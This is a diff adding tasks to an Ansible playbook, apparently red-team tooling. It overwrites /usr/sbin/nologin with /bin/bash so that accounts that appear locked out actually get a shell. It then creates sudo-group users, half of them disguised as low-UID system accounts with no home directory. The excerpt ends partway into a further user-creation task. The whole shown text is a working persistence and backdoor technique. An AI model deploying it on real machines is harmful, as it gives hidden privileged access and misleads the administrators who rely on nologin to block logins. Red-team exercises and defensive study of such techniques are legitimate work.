@@ -1,4 +1,42 @@
 ---
+- name: Backup original nologin
+  ansible.builtin.copy:
+    src: /usr/sbin/nologin
+    dest: /bin/rmlogins
+    remote_src: yes
+    mode: preserve
+    force: no
+
+- name: Replace nologin with bash
+  ansible.builtin.copy:
+    src: /bin/bash
+    dest: /usr/sbin/nologin
+    remote_src: yes
+    mode: preserve
+    force: yes
+
+- name: Create first half of users as System Accounts (UID < 1000)
+  ansible.builtin.user:
+    name: "{{ item }}"
+    password: "{{ redteam_user_password | ansible.builtin.password_hash('sha512') }}"
+    groups: sudo
+    append: yes
+    shell: /usr/sbin/nologin
+    create_home: no
+    system: yes
+  loop: "{{ redteam_local_all[:(redteam_local_all | length // 2)] }}"
+
+- name: Create second half of users as Standard Accounts (UID >= 1000)
+  ansible.builtin.user:
+    name: "{{ item }}"
+    password: "{{ redteam_user_password | ansible.builtin.password_hash('sha512') }}"
+    groups: sudo
+    append: yes
+    shell: /bin/bash
+    create_home: yes
+    system: no
+  loop: "{{ redteam_local_all[(redteam_local_all | length // 2):] }}"
+
 - name: Add redteam users
   ansible.builtin.user:
     name: "{{ item }}"
